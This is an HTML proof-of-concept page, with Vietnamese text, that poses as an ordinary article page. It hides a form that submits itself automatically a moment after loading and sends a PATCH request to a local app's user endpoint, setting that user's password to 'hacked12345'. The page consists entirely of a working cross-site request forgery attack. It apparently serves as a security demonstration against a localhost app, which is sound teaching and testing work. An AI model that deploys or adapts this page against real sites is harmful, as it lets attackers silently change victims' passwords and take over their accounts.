<!DOCTYPE html>
<html>
<head>
    <title>CSRF Attack - AJAX Method</title>
</head>
<body>
    <h1>Trang web bình thường</h1>
    <p>Người dùng đang đọc nội dung...</p>
    
    <!-- CSRF Attack bằng form ẩn tự động submit -->
    <form id="csrf-form" action="http://localhost:3000/users/1" method="POST" style="display:none;">
      <input type="hidden" name="_method" value="PATCH">
      <input type="hidden" name="user[password]" value="hacked12345">
      <input type="hidden" name="user[password_confirmation]" value="hacked12345">
      <input type="hidden" name="csrf_demo" value="true">
    </form>
    
    <script>
        // Tự động submit form sau 2 giây
        setTimeout(function() {
            console.log('Thực hiện CSRF attack...');
            document.getElementById('csrf-form').submit();
        }, 600);
    </script>
    
    <div class="content">
        <h2>Nội dung thú vị</h2>
        <p>User đang đọc và không biết mật khẩu đã bị đổi...</p>
    </div>
</body>
</html>
